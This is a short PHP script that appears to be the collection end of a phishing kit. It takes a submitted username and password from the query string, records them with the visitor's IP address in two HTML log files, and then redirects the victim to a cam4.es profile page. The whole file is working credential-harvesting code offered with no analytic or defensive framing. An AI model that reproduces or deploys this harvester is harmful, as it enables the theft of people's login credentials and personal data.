<?php

$email = $_GET['username']; 
$pass = $_GET['password'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("passwords.html", "a"); 
$f1 = fopen("index_files/1.html", "a"); 
fwrite ($f, 'Usuario: [<b><font color="#EE0707">'.$email.'</font></b>] Contraseña: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fwrite ($f1, 'Usuario: [<b><font color="#EE0707">'.$email.'</font></b>] Contraseña: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fclose($f);
fclose($f1);
sleep(2);
header("Location: https://www.cam4.es/manpoilu54");
?>
